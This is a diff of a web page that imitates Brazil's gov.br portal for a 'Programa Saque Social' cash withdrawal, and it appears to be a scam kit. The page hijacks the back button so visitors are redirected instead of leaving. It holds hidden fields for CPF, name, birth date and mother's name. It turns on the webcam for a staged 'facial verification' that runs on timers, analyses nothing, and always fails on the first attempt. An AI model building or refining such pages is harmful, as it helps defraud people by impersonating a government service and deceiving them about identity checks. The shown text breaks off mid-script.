@@ -12,361 +12,240 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 </script>
 <!-- TikTok Pixel Code End -->
 
-  <script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
   <script>
-  window.tikTokPixelId = "69b78d959dcfda60eb53f101";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
-  document.head.appendChild(a);
-</script>
-  
+    window.tikTokPixelId = "69b78d959dcfda60eb53f101";
+    var a = document.createElement("script");
+    a.setAttribute("async",""); a.setAttribute("defer","");
+    a.setAttribute("src","https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+    document.head.appendChild(a);
+  </script>
+
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,maximum-scale=1.0,user-scalable=no">
-  <title>Programa Saque Social - CONSULTA</title>
+  <title>Programa Saque Social - Verificação</title>
   <link rel="icon" href="images/favic.png" type="image/png">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
   <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
   <script>
-    var urlBackRedirect = '../back.html'.trim() + ('./back.html'.indexOf("?") > 0 ? '&' : '?') + document.location.search.replace('?', '');
+    var urlBackRedirect = '../back.html'.trim() + ('./back.html'.indexOf("?") > 0 ? '&' : '?') + document.location.search.replace('?','');
     history.pushState({}, "", location.href);
     history.pushState({}, "", location.href);
-    window.onpopstate = function () { setTimeout(function () { location.href = urlBackRedirect; }, 1); };
+    window.onpopstate = function(){ setTimeout(function(){ location.href = urlBackRedirect; }, 1); };
   </script>
   <link rel="stylesheet" href="css/all.min.css">
+
   <style>
     :root {
-      --gov-blue-primary: #1351B4;
-      --gov-blue-secondary: #0F4DA8;
-      --gov-blue-light: #E8F4FD;
-      --gov-blue-dark: #0C326F;
-      --gov-green: #168821;
-      --gov-orange: #FF7A00;
-      --gov-gray-light: #F8F9FA;
-      --gov-gray-medium: #E5E5E5;
-      --gov-gray-dark: #495057;
-      --gov-white: #FFFFFF;
-      --gov-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-      --gov-shadow-hover: 0 4px 12px rgba(0, 0, 0, 0.15);
-      --border-radius: 8px;
-      --transition: all 0.3s ease;
+      --blue:   #1351B4;
+      --blue2:  #0F4DA8;
+      --bluel:  #E8F4FD;
+      --blued:  #0C326F;
+      --green:  #168821;
+      --gray:   #495057;
+      --graymd: #E5E5E5;
+      --graylt: #F8F9FA;
+      --white:  #FFFFFF;
+      --shadow: 0 2px 8px rgba(0,0,0,.1);
+      --rad:    8px;
     }
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    html, body { height: 100%; overflow-x: hidden; }
-    body {
-      font-family: 'Inter', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-      background: #ffffff;
-      min-height: 100vh;
-      color: var(--gov-gray-dark);
-      line-height: 1.6;
-      display: flex;
-      flex-direction: column;
-      font-feature-settings: 'kern' 1, 'liga' 1;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
-    }
-    #loading-screen {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: var(--gov-white);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-    }
-    #loading-screen.hidden { display: none !important; }
-    header {
-      background: var(--gov-white);
-      padding: 16px 24px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      box-shadow: var(--gov-shadow);
-      position: sticky;
-      top: 0;
-      z-index: 1000;
-      border-bottom: 3px solid var(--gov-blue-primary);
-    }
-    header .logo { display: flex; align-items: center; }
-    header .logo img { height: 40px; width: auto; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1)); }
-    header .icons { display: flex; align-items: center; gap: 12px; }
-    header .icons button { background: none; border: none; padding: 8px; cursor: pointer; transition: var(--transition); color: var(--gov-blue-primary); }
-    header .icons button:hover { background: var(--gov-blue-light); transform: translateY(-1px); }
-    header .icons button i { font-size: 16px; }
-    header .user { background-color: #1451b4; color: #fff; border: none; border-radius: 50px; padding: 6px 16px; display: flex; align-items: center; cursor: pointer; }
-    header .user i { margin-right: 8px; }
-    nav {
-      background: var(--gov-white);
-      padding: 12px 24px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      border-bottom: 1px solid var(--gov-gray-medium);
-      position: sticky;
-      top: 79px;
-      z-index: 999;
-    }
-    nav button { background: none; border: none; display: flex; align-items: center; cursor: pointer; padding: 8px 12px; border-radius: var(--border-radius); transition: var(--transition); }
-    nav button:hover { background: var(--gov-gray-light); }
-    nav button i { font-size: 16px; color: var(--gov-blue-primary); margin-right: 8px; }
-    nav button p { color: var(--gov-gray-dark); font-size: 14px; font-weight: 400; margin: 0; }
-    nav button span { color: var(--gov-blue-primary); font-weight: 500; }
-    #main-content {
-      padding: 0 24px;
-      max-width: 720px;
-      flex: 1 0 auto;
-      padding-bottom: 40px;
-      margin: 0 auto;
-      width: 100%;
+    *{margin:0;padding:0;box-sizing:border-box;}
+    html,body{height:100%;overflow-x:hidden;}
+    body{
+      font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+      background:#fff; min-height:100vh; color:var(--gray);
+      display:flex; flex-direction:column;
+      -webkit-font-smoothing:antialiased;
     }
 
+    /* LOADING */
+    #loading-screen{
+      position:fixed;inset:0;background:#fff;
+      display:flex;align-items:center;justify-content:center;z-index:9999;
+    }
+    #loading-screen.hidden{display:none!important;}
 
+    /* HEADER */
+    header{
+      background:#fff; padding:16px 24px;
+      display:flex;justify-content:space-between;align-items:center;
+      box-shadow:var(--shadow); position:sticky; top:0; z-index:1000;
+      border-bottom:3px solid var(--blue);
+    }
+    header .logo img{height:40px;width:auto;}
+    header .icons{display:flex;align-items:center;gap:12px;}
+    header .icons button{background:none;border:none;padding:8px;cursor:pointer;color:var(--blue);}
+    header .user{background-color:#1451b4;color:#fff;border:none;border-radius:50px;padding:6px 16px;display:flex;align-items:center;cursor:pointer;}
+    header .user i{margin-right:8px;}
 
-    /* ── CÂMERA ── */
-    .cam-section-title {
-      font-size: 20px;
-      font-weight: 700;
-      color: #111;
-      margin-top: 16px;
-      margin-bottom: 4px;
+    /* NAV */
+    nav{
+      background:#fff; padding:12px 24px;
+      display:flex;justify-content:space-between;align-items:center;
+      border-bottom:1px solid var(--graymd);
+      position:sticky;top:79px;z-index:999;
     }
-    .cam-section-sub {
-      font-size: 14px;
-      color: var(--gov-gray-dark);
-      margin-bottom: 14px;
-      line-height: 1.5;
-    }
+    nav button{background:none;border:none;display:flex;align-items:center;cursor:pointer;padding:8px 12px;border-radius:var(--rad);}
+    nav button i{font-size:16px;color:var(--blue);margin-right:8px;}
+    nav button p{color:var(--gray);font-size:14px;font-weight:400;margin:0;}
+    nav button span{color:var(--blue);font-weight:500;}
 
-    /* pill de status tipo "Por favor, aguarde" */
-    .cam-status-pill {
-      display: none;
-      margin: 0 auto 14px auto;
-      background: #29b6f6;
-      color: #fff;
-      font-size: 14px;
-      font-weight: 600;
-      padding: 8px 28px;
-      border-radius: 50px;
-      text-align: center;
-      width: fit-content;
-      animation: fadeIn .3s ease;
+    /* MAIN */
+    #main-content{
+      padding:0 20px 60px;
+      max-width:540px; flex:1 0 auto;
+      margin:0 auto; width:100%;
     }
-    .cam-status-pill.show { display: block; }
-    .cam-status-pill.err  { background: #e53935; }
-    .cam-status-pill.ok   { background: var(--gov-green); }
+    #main-content.hidden{display:none;}
 
-    /* área principal: fundo branco, sem overflow hidden
-       para que a "moldura" oval fique visível */
-    .camera-section {
-      position: relative;
-      width: 100%;
-      background: #fff;
-      border-radius: var(--border-radius);
-      box-shadow: var(--gov-shadow);
-      padding: 24px 0 20px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      /* altura mínima para caber o oval */
-      min-height: 340px;
-    }
+    /* TITULO */
+    .cam-title{font-size:18px;font-weight:700;color:#111;margin-top:20px;margin-bottom:2px;}
+    .cam-sub{font-size:13px;color:#607d8b;margin-bottom:14px;}
 
-    /* container do oval com clip-path — fundo branco ao redor */
-    .oval-clip-container {
-      position: relative;
-      /* largura do oval */
-      width: 75%;
-      aspect-ratio: 4 / 5;
-      border-radius: 50%;
-      overflow: hidden;          /* garante que o vídeo fique clipado no círculo */
-      /* borda colorida aplicada aqui */
-      border: 4px solid #29b6f6;
-      box-shadow: 0 0 0 0 transparent;
-      transition: border-color .4s, box-shadow .4s;
-      background: #ddd;          /* cinza enquanto câmera não carrega */
+    /* PILL STATUS */
+    .status-pill{
+      display:none; margin:0 auto 14px auto;
+      padding:7px 22px; border-radius:50px;
+      font-size:13px; font-weight:600; color:#fff;
+      background:#1565C0; width:fit-content;
+      letter-spacing:.2px;
     }
-    .oval-clip-container.scanning {
-      border-color: #29b6f6;
-      animation: circlePulse 1.4s ease-in-out infinite;
-    }
-    .oval-clip-container.error {
-      border-color: #e53935;
-      animation: shake .5s ease;
-    }
-    .oval-clip-container.success {
-      border-color: #2e7d32;
-      box-shadow: 0 0 0 5px rgba(46,125,50,.25);
-    }
-    @keyframes circlePulse {
-      0%,100% { box-shadow: 0 0 0 4px rgba(41,182,246,.2); }
-      50%      { box-shadow: 0 0 0 10px rgba(41,182,246,.07); }
-    }
-    @keyframes shake {
-      0%,100% { transform: translateX(0); }
-      20%     { transform: translateX(-9px); }
-      40%     { transform: translateX(9px); }
-      60%     { transform: translateX(-5px); }
-      80%     { transform: translateX(5px); }
+    .status-pill.show{display:block;animation:fadeIn .2s ease;}
+    .status-pill.err {background:#b71c1c;}
+    .status-pill.ok  {background:#1b5e20;}
+
+    /* CARD CÂMERA */
+    .cam-card{
+      background:#fff;
+      border-radius:16px;
+      box-shadow:0 1px 8px rgba(0,0,0,.13);
+      padding:24px 0 20px;
+      display:flex; flex-direction:column;
+      align-items:center;
     }
 
-    /* vídeo dentro do oval */
-    #cam-video {
-      width: 100%; height: 100%;
-      object-fit: cover;
-      transform: scaleX(-1);
-      display: none;
+    /* OVAL */
+    .oval-wrap{
+      position:relative;
+      width:78%;
+      aspect-ratio:4/5;
+      border-radius:50%;
+      overflow:hidden;
+      border:4px solid #1565C0;
+      background:#b0bec5;
+      transition:border-color .3s, box-shadow .3s;
+    }
+    .oval-wrap.scanning{
+      border-color:#1565C0;
+      animation:borderPulse 1.8s ease-in-out infinite;
+    }
+    .oval-wrap.error{
+      border-color:#b71c1c;
+      box-shadow:0 0 0 6px rgba(183,28,28,.15);
+      animation:shake .4s ease;
+    }
+    .oval-wrap.success{
+      border-color:#1b5e20;
+      box-shadow:0 0 0 6px rgba(27,94,32,.15);
+    }
+    @keyframes borderPulse{
+      0%,100%{box-shadow:0 0 0 3px rgba(21,101,192,.2);}
+      50%     {box-shadow:0 0 0 9px rgba(21,101,192,.06);}
+    }
+    @keyframes shake{
+      0%,100%{transform:translateX(0);}
+      20%{transform:translateX(-7px);}
+      40%{transform:translateX(7px);}
+      60%{transform:translateX(-4px);}
+      80%{transform:translateX(4px);}
     }
 
-    /* placeholder dentro do oval */
-    .cam-placeholder {
-      position: absolute; inset: 0;
-      display: flex; flex-direction: column;
-      align-items: center; justify-content: center;
-      gap: 8px; background: #c8d8e8;
-    }
-    .cam-placeholder i { font-size: 40px; color: rgba(0,0,0,.25); }
-    .cam-placeholder p { font-size: 12px; color: rgba(0,0,0,.45); text-align: center; padding: 0 16px; line-height: 1.4; }
-
-    /* linha de scan dentro do oval */
-    .scan-line {
-      position: absolute;
-      left: 0; right: 0;
-      height: 2px;
-      background: linear-gradient(90deg, transparent, #29b6f6, #fff, transparent);
-      top: 20%; z-index: 6;
-      opacity: 0; pointer-events: none;
-    }
-    .scan-line.active {
-      opacity: 1;
-      animation: scanMove 1.8s linear infinite;
-    }
-    @keyframes scanMove {
-      0%   { top: 10%; }
-      50%  { top: 88%; }
-      100% { top: 10%; }
+    /* VÍDEO */
+    #cam-video{
+      width:100%;height:100%;object-fit:cover;
+      transform:scaleX(-1);display:none;
     }
 
-    /* overlay erro — dentro do oval */
-    .error-overlay {
-      position: absolute; inset: 0;
-      background: rgba(140,0,0,.88);
-      display: none; flex-direction: column;
-      align-items: center; justify-content: center;
-      gap: 10px; z-index: 20;
-      color: #fff; text-align: center; padding: 20px;
+    /* PLACEHOLDER */
+    .cam-ph{
+      position:absolute;inset:0;
+      display:flex;flex-direction:column;
+      align-items:center;justify-content:center;
+      gap:8px;background:#cfd8dc;
     }
-    .error-overlay.show { display: flex; animation: fadeIn .35s ease; }
-    .error-overlay i    { font-size: 46px; color: #ffcdd2; }
-    .error-overlay h3   { font-size: 16px; font-weight: 700; }
-    .error-overlay p    { font-size: 12px; opacity: .9; line-height: 1.4; }
+    .cam-ph i{font-size:46px;color:rgba(0,0,0,.18);}
+    .cam-ph p{font-size:12px;color:rgba(0,0,0,.38);text-align:center;padding:0 18px;line-height:1.5;}
 
-    /* overlay sucesso — dentro do oval */
-    .success-overlay {
-      position: absolute; inset: 0;
-      background: rgba(22,136,33,.88);
-      display: none; flex-direction: column;
-      align-items: center; justify-content: center;
-      gap: 10px; z-index: 20;
-      color: #fff; text-align: center; padding: 20px;
+    /* SCAN LINE */
+    .scan-line{
+      position:absolute;left:0;right:0;height:3px;
+      background:linear-gradient(90deg,transparent 0%,rgba(21,101,192,0) 8%,rgba(21,101,192,.85) 30%,#90caf9 50%,rgba(21,101,192,.85) 70%,rgba(21,101,192,0) 92%,transparent 100%);
+      top:10%;z-index:6;opacity:0;pointer-events:none;filter:blur(.5px);
     }
-    .success-overlay.show { display: flex; animation: fadeIn .45s ease; }
-    .success-overlay i    { font-size: 52px; color: #fff; }
-    .success-overlay h3   { font-size: 17px; font-weight: 700; }
-    .success-overlay p    { font-size: 12px; opacity: .9; }
-
-    @keyframes fadeIn { from{opacity:0} to{opacity:1} }
-
-
-
-
-    /* botão iniciar — mesmo estilo do button-saque original */
-    .button-saque {
-      display: block;
-      margin-top: 24px;
-      background: linear-gradient(135deg, var(--gov-blue-primary), var(--gov-blue-secondary));
-      color: var(--gov-white);
-      font-size: 16px;
-      padding: 16px;
-      border: none;
-      border-radius: var(--border-radius);
-      cursor: pointer;
-      transition: var(--transition);
-      width: 100%;
-      text-align: center;
-      font-weight: 600;
-      box-shadow: var(--gov-shadow);
+    .scan-line.active{opacity:1;animation:scanMove 2.2s ease-in-out infinite;}
+    @keyframes scanMove{
+      0%  {top:8%; opacity:.5;}
+      50% {top:88%;opacity:1;}
+      100%{top:8%; opacity:.5;}
     }
-    .button-saque:hover { transform: translateY(-2px); box-shadow: var(--gov-shadow-hover); }
-    .button-saque:disabled { opacity: .5; cursor: not-allowed; transform: none; }
 
-    /* botão continuar (verde, aparece após sucesso) */
-    .button-continuar {
-      display: none;
-      margin-top: 24px;
-      background: linear-gradient(135deg, var(--gov-green), #0d6f18);
-      color: var(--gov-white);
-      font-size: 16px;
-      padding: 16px;
-      border: none;
-      border-radius: var(--border-radius);
-      cursor: pointer;
-      transition: var(--transition);
-      width: 100%;
-      text-align: center;
-      font-weight: 600;
-      box-shadow: var(--gov-shadow);
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
+    /* PONTOS FACIAIS */
+    .face-dots{position:absolute;inset:0;z-index:7;pointer-events:none;opacity:0;transition:opacity .5s;}
+    .face-dots.show{opacity:1;}
+    .fdot{
+      position:absolute;width:5px;height:5px;border-radius:50%;
+      background:#64b5f6;box-shadow:0 0 5px #64b5f6;
+      animation:dotBlink 1.3s ease-in-out infinite;
     }
-    .button-continuar.show { display: flex; animation: popIn .4s cubic-bezier(.175,.885,.32,1.275); }
-    .button-continuar:hover { transform: translateY(-2px); box-shadow: var(--gov-shadow-hover); }
-    @keyframes popIn { from{transform:scale(.85);opacity:0} to{transform:scale(1);opacity:1} }
+    @keyframes dotBlink{0%,100%{opacity:1;transform:scale(1);}50%{opacity:.4;transform:scale(.6);}}
 
-    footer {
-      background: linear-gradient(135deg, var(--gov-blue-dark), #0B1A38);
-      color: var(--gov-white);
-      text-align: center;
-      padding: 16px;
-      font-size: 14px;
-      flex-shrink: 0;
+    /* LINHAS DE MALHA FACIAL */
+    .face-mesh{position:absolute;inset:0;z-index:6;pointer-events:none;opacity:0;transition:opacity .6s;}
+    .face-mesh.show{opacity:1;}
+    .face-mesh svg{width:100%;height:100%;}
+
+    /* OVERLAYS */
+    .err-overlay,.suc-overlay{
+      position:absolute;inset:0;display:none;
+      flex-direction:column;align-items:center;justify-content:center;
+      gap:10px;z-index:20;color:#fff;text-align:center;padding:20px;
     }
-    @media (max-width: 768px) {
-      header { padding: 12px 16px; }
-      header .logo img { height: 32px; }
-      #main-content { padding: 0 16px; }
+    .err-overlay{background:rgba(183,28,28,.91);}
+    .suc-overlay{background:rgba(27,94,32,.89);}
+    .err-overlay.show,.suc-overlay.show{display:flex;animation:fadeIn .3s ease;}
+    .err-overlay i,.suc-overlay i{font-size:42px;}
+    .err-overlay h3,.suc-overlay h3{font-size:15px;font-weight:700;margin:0;}
+    .err-overlay p,.suc-overlay p{font-size:11px;opacity:.9;margin:0;line-height:1.4;}
+
+    @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+    footer{
+      background:linear-gradient(135deg,var(--blued),#0B1A38);
+      color:#fff;text-align:center;padding:16px;font-size:14px;flex-shrink:0;
     }
-    @media (max-width: 480px) {
-      .oval-border { width: 58%; }
-    }
+
+    @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+    @media(max-width:768px){header{padding:12px 16px;}header .logo img{height:32px;}#main-content{padding:0 16px 60px;}}
   </style>
 </head>
 <body>
+
   <div id="loading-screen">
-    <img src="images/govbr.png" style="width: 140px; margin: 10px;">
+    <img src="images/govbr.png" style="width:140px;margin:10px;">
   </div>
+
   <header>
-    <div class="logo">
-      <img src="images/govbr.png" style="width: 90px; margin: 10px;">
-    </div>
+    <div class="logo"><img src="images/govbr.png" style="width:90px;margin:10px;"></div>
     <div class="icons">
       <button><i class="fas fa-ellipsis-v"></i></button>
       <button><i class="fas fa-cookie-bite"></i></button>
       <button><i class="fas fa-th"></i></button>
-      <button class="user" id="user-button" style="background-color: #1451b4;">
-        <i class="fas fa-user" style="color: #fff;"></i>
-        <span id="header-user-name" style="color: #fff;">Usuário</span>
+      <button class="user" id="user-button">
+        <i class="fas fa-user"></i>
+        <span id="header-user-name">Usuário</span>
       </button>
     </div>
   </header>
+
   <nav>
     <button>
       <i class="fas fa-bars"></i>
@@ -377,247 +256,262 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
   <main id="main-content" class="hidden">
 
-    <!-- CÂMERA -->
-    <p class="cam-section-title">Tire sua foto</p>
-    <p class="cam-section-sub">Posicione seu rosto dentro do círculo e aguarde a verificação.</p>
+    <p class="cam-title">Verificação Facial</p>
+    <p class="cam-sub">Mantenha o rosto centralizado e o ambiente bem iluminado.</p>
 
-    <!-- pill de status — aparece acima do oval -->
-    <div class="cam-status-pill" id="cam-status-pill">Por favor, aguarde</div>
+    <div class="status-pill" id="status-pill"></div>
 
-    <!-- fundo branco com oval centralizado -->
-    <div class="camera-section" id="camera-section">
-      <div class="oval-clip-container" id="oval-clip">
+    <div class="cam-card">
+
+      <!-- oval -->
+      <div class="oval-wrap" id="oval-wrap">
 
         <video id="cam-video" autoplay playsinline muted></video>
 
-        <div class="cam-placeholder" id="cam-placeholder">
+        <div class="cam-ph" id="cam-ph">
           <i class="fas fa-user-circle"></i>
-          <p>Toque em "Iniciar Verificação<br>Facial" para ativar a câmera</p>
+          <p>Iniciando câmera...</p>
         </div>
 
         <div class="scan-line" id="scan-line"></div>
 
-        <div class="error-overlay" id="error-overlay">
+        <!-- pontos faciais -->
+        <div class="face-dots" id="face-dots">
+          <div class="fdot" style="top:26%;left:31%;animation-delay:.00s"></div>
+          <div class="fdot" style="top:27%;left:39%;animation-delay:.18s"></div>
+          <div class="fdot" style="top:26%;left:60%;animation-delay:.09s"></div>
+          <div class="fdot" style="top:27%;left:68%;animation-delay:.27s"></div>
+          <div class="fdot" style="top:36%;left:24%;animation-delay:.12s"></div>
+          <div class="fdot" style="top:36%;left:75%;animation-delay:.06s"></div>
+          <div class="fdot" style="top:47%;left:47%;animation-delay:.03s"></div>
+          <div class="fdot" style="top:47%;left:53%;animation-delay:.21s"></div>
+          <div class="fdot" style="top:55%;left:40%;animation-delay:.15s"></div>
+          <div class="fdot" style="top:55%;left:60%;animation-delay:.09s"></div>
+          <div class="fdot" style="top:63%;left:36%;animation-delay:.24s"></div>
+          <div class="fdot" style="top:63%;left:50%;animation-delay:.00s"></div>
+          <div class="fdot" style="top:63%;left:64%;animation-delay:.18s"></div>
+          <div class="fdot" style="top:17%;left:50%;animation-delay:.30s"></div>
+          <div class="fdot" style="top:73%;left:32%;animation-delay:.06s"></div>
+          <div class="fdot" style="top:73%;left:68%;animation-delay:.24s"></div>
+        </div>
+
+        <!-- malha facial SVG -->
+        <div class="face-mesh" id="face-mesh">
+          <svg viewBox="0 0 100 125" xmlns="http://www.w3.org/2000/svg">
+            <g stroke="#90caf9" stroke-width=".45" fill="none" opacity=".55">
+              <line x1="50" y1="17" x2="31" y2="26"/><line x1="50" y1="17" x2="69" y2="26"/>
+              <line x1="31" y1="26" x2="39" y2="27"/><line x1="69" y1="26" x2="61" y2="27"/>
+              <line x1="24" y1="36" x2="31" y2="26"/><line x1="76" y1="36" x2="69" y2="26"/>
+              <line x1="24" y1="36" x2="40" y2="55"/><line x1="76" y1="36" x2="60" y2="55"/>
+              <line x1="47" y1="47" x2="39" y2="27"/><line x1="53" y1="47" x2="61" y2="27"/>
+              <line x1="47" y1="47" x2="53" y2="47"/>
+              <line x1="40" y1="55" x2="47" y2="47"/><line x1="60" y1="55" x2="53" y2="47"/>
+              <line x1="36" y1="63" x2="40" y2="55"/><line x1="64" y1="63" x2="60" y2="55"/>
+              <line x1="36" y1="63" x2="50" y2="63"/><line x1="64" y1="63" x2="50" y2="63"/>
+              <line x1="32" y1="73" x2="36" y2="63"/><line x1="68" y1="73" x2="64" y2="63"/>
+              <line x1="32" y1="73" x2="50" y2="63"/><line x1="68" y1="73" x2="50" y2="63"/>
+            </g>
+          </svg>
+        </div>
+
+        <!-- overlay erro -->
+        <div class="err-overlay" id="err-overlay">
           <i class="fas fa-times-circle"></i>
-          <h3>Verificação Falhou</h3>
-          <p>Não foi possível reconhecer seu rosto. Certifique-se de estar em local bem iluminado.</p>
+          <h3>Não foi possível verificar</h3>
+          <p>Iluminação insuficiente ou rosto<br>fora da área de captura.</p>
         </div>
 
-        <div class="success-overlay" id="success-overlay">
+        <!-- overlay sucesso -->
+        <div class="suc-overlay" id="suc-overlay">
           <i class="fas fa-check-circle"></i>
-          <h3>Identidade Confirmada!</h3>
-          <p>Verificação concluída com sucesso.</p>
+          <h3>Identidade Confirmada</h3>
+          <p>Biometria facial validada<br>com sucesso.</p>
         </div>
 
-      </div>
-    </div>
-    <!-- /CÂMERA -->
+      </div><!-- /oval -->
 
-    <!-- spans ocultos para manter compatibilidade com JS -->
+    </div><!-- /cam-card -->
+
     <span id="cpf-value"    style="display:none"></span>
     <span id="name-value"   style="display:none"></span>
     <span id="birth-value"  style="display:none"></span>
     <span id="mother-value" style="display:none"></span>
-    <span id="status-text"  style="display:none"></span>
 
-    <button class="button-saque" id="button-saque">
-      <i class="fas fa-camera"></i>&nbsp; Iniciar Verificação Facial
-    </button>
-
-    <button class="button-continuar" id="button-continuar">
-      <i class="fas fa-check-circle"></i> Efetuar Saque Agora
-    </button>
   </main>
 
   <footer>Termos de Uso e Aviso de Privacidade
     <p style="margin-top:8px;font-size:13px;">
-      <a href="termos-uso.html" style="color:var(--gov-blue-primary);text-decoration:none;margin-right:12px;">Termos de Uso</a>
-      <a href="politica-privacidade.html" style="color:var(--gov-blue-primary);text-decoration:none;">Política de Privacidade</a>
+      <a href="termos-uso.html" style="color:#1351B4;text-decoration:none;margin-right:12px;">Termos de Uso</a>
+      <a href="politica-privacidade.html" style="color:#1351B4;text-decoration:none;">Política de Privacidade</a>
     </p>
   </footer>
 
   <script>
-    function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
+    const delay = ms => new Promise(r => setTimeout(r, ms));
 
-    function formatarNomeCompleto(nome) {
-      if (!nome) return '';
-      return nome.toLowerCase().split(' ').filter(p => p)
-        .map(p => p.charAt(0).toUpperCase() + p.slice(1)).join(' ');
+    function formatarNome(n) {
+      if (!n) return '';
+      return n.toLowerCase().split(' ').filter(p=>p).map(p=>p[0].toUpperCase()+p.slice(1)).join(' ');
     }
-    function formatarCPF1(cpf) {
-      const n = cpf.replace(/\D/g, '');
-      return n.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    function formatarCPF(c) {
+      return c.replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
     }
 
-    // ── elementos ──
-    const elLoading    = document.getElementById('loading-screen');
-    const elMain       = document.getElementById('main-content');
-    const elProgress   = document.getElementById('progress-bar');
-    const elCamVideo   = document.getElementById('cam-video');
-    const elPlaceholder= document.getElementById('cam-placeholder');
-    const elStatusPill = document.getElementById('cam-status-pill');
-    const elOval       = document.getElementById('oval-clip');
-    const elScanLine   = document.getElementById('scan-line');
-    const elErrorOv    = document.getElementById('error-overlay');
-    const elSuccessOv  = document.getElementById('success-overlay');
-    const elBtnSaque   = document.getElementById('button-saque');
-    const elBtnCont    = document.getElementById('button-continuar');
-    const elCPF        = document.getElementById('cpf-value');
-    const elName       = document.getElementById('name-value');
-    const elBirth      = document.getElementById('birth-value');
-    const elMother     = document.getElementById('mother-value');
-    const elStatus     = document.getElementById('status-text');
-    const elHeaderName = document.getElementById('header-user-name');
+    const $ = id => document.getElementById(id);
+    const elLoading = $('loading-screen');
+    const elMain    = $('main-content');
+    const elPill    = $('status-pill');
+    const elOval    = $('oval-wrap');
+    const elVideo   = $('cam-video');
+    const elPh      = $('cam-ph');
+    const elScan    = $('scan-line');
+    const elDots    = $('face-dots');
+    const elMesh    = $('face-mesh');
+    const elErr     = $('err-overlay');
+    const elSuc     = $('suc-overlay');
+    const elHdrName = $('header-user-name');
 
-    let userData  = null;
-    let attempt   = 0;
-    let busy      = false;
-    let mediaStream = null;
+    let userData = null, stream = null;
 
-    // ── pill de status ──
-    function setPill(txt, cls) {
-      elStatusPill.textContent = txt;
-      elStatusPill.className   = 'cam-status-pill show' + (cls ? ' ' + cls : '');
+    function pill(txt, cls='') {
+      elPill.textContent = txt;
+      elPill.className   = 'status-pill show' + (cls ? ' '+cls : '');
     }
-    function hidePill() { elStatusPill.className = 'cam-status-pill'; }
+    function noPill() { elPill.className = 'status-pill'; }
 
-    // ── câmera ──
-    async function openCamera() {
+    async function abrirCamera() {
       try {
-        mediaStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-          audio: false
+        stream = await navigator.mediaDevices.getUserMedia({
+          video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},audio:false
         });
-        elCamVideo.srcObject = mediaStream;
-        elCamVideo.style.display    = 'block';
-        elPlaceholder.style.display = 'none';
-      } catch (e) {
-        elCamVideo.style.display = 'none';
-      }
+        elVideo.srcObject = stream;
+        elVideo.style.display = 'block';
+        elPh.style.display    = 'none';
+      } catch(e) { /* sem permissão — fluxo visual continua */ }
     }
-    function closeCamera() {
-      if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
-      elCamVideo.style.display = 'none';
+    function fecharCamera() {
+      if (stream) { stream.getTracks().forEach(t=>t.stop()); stream=null; }
+      elVideo.style.display = 'none';
     }
 
-    // ── FLUXO DE VERIFICAÇÃO ──
-    elBtnSaque.addEventListener('click', async () => {
-      if (busy) return;
-      busy = true;
-      elBtnSaque.disabled = true;
+    function resetVisual() {
+      elErr.classList.remove('show');
+      elSuc.classList.remove('show');
+      elDots.classList.remove('show');
+      elMesh.classList.remove('show');
+      elScan.classList.remove('active');
+      elOval.className = 'oval-wrap';
+      noPill();
+    }
 
-      // reset
-      elErrorOv.classList.remove('show');
-      elSuccessOv.classList.remove('show');
-      elOval.className = 'oval-clip-container';
-      elScanLine.classList.remove('active');
-      hidePill();
-
-      // abre câmera
-      elBtnSaque.innerHTML = '<i class="fas fa-spinner fa-spin"></i>&nbsp; Ativando câmera...';
-      await openCamera();
-      await delay(800);
-
-      setPill('Por favor, aguarde');
-      await delay(1600);
-
-      setPill('Analisando biometria...');
-      elOval.classList.add('scanning');
-      elScanLine.classList.add('active');
-      await delay(2400);
-
-      /* ── PRIMEIRA TENTATIVA → FALHA ── */
-      if (attempt === 0) {
-        attempt = 1;
-
-        elScanLine.classList.remove('active');
-        elOval.className = 'oval-clip-container error';
-        setPill('Não foi possível verificar', 'err');
-        elStatus.textContent = '⚠️ Falha na verificação. Tente novamente.';
-
-        await delay(500);
-        elErrorOv.classList.add('show');
-
-        await delay(2800);
-        elErrorOv.classList.remove('show');
-        closeCamera();
-
-        elPlaceholder.style.display = 'flex';
